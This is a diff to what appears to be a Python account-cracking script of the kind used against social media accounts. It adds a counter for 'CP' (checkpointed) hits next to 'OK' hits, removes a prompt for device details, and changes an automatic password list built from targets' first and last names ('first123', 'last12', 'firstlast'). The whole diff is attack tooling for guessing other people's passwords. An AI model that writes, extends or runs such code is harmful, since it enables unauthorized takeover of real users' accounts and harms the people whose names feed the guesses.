@@ -185,6 +185,7 @@ rp=(f"\033[{holaa};147m")
 loop = 0
 methods = []
 ok=[]
+cp=[]
 total=[]
 clone_type=[]
 android_models = []
@@ -422,8 +423,9 @@ class crack_main():
                 self.pasw()
         def m1(self,iid,name,passlist):
                 try:
-                        global ok,loop,android_models
+                        global ok,cp,loop,android_models
                         sys.stdout.write('\r[ZEE] %s / [OK-%s] \r'%(loop,len(ok)));sys.stdout.flush()
+                        sys.stdout.write('\r[ZEE] %s / [CP-%s] \r'%(loop,len(cp)));sys.stdout.flush()
                         fn = name.split(' ')[0]
                         try:
                                 ln = name.split(' ')[1]
@@ -488,24 +490,6 @@ class crack_main():
 
         def pasw(self):
                 passlist = []
-                if not os.path.exists('device_info.txt'):
-                        os.system('clear')
-                        print(logo)
-                        print(" what is your andriod version ex 8,9,10")
-                        version_=input(' type andriod version : ')
-                        print(44*'=')
-                        print(" your mobile module name ex Techno LD7 etc")
-                        model_=input(" module name : ")
-                        print(44*"=")
-                        print(" your mobile company name ex Techno,Redmi")
-                        brand_name_=input(" device company name : ")
-                        print(44*'=')
-                        print(" your mobile width ex 720,740,730,780 etc")
-                        width_=input(" device width : ")
-                        print(44*'=')
-                        print(" your mobile height ex 1660,1780,1730 etc")
-                        height_=input(" device height : ")
-                        info_file = open("device_info.txt","a").write(version_+'$'+model_+'$'+brand_name_+'$'+width_+'$'+height_)
                 os.system('clear')
                 print(logo)
                 print(' for auto password list type auto or Auto')
@@ -515,11 +499,11 @@ class crack_main():
                         passlist.append('first123')
                         passlist.append('first12345')
                         passlist.append('first1234')
-                        passlist.append('khan12')
-                        passlist.append('khankhan')
-                        passlist.append('khan123')
-                        passlist.append('first786')
                         passlist.append('first12')
+                        passlist.append('firstlast')
+                        passlist.append('first last')
+                        passlist.append('first786')
+                        passlist.append('last12')
                         passlist.append('first1122')
                         passlist.append('last123')
                         passlist.append('last12')
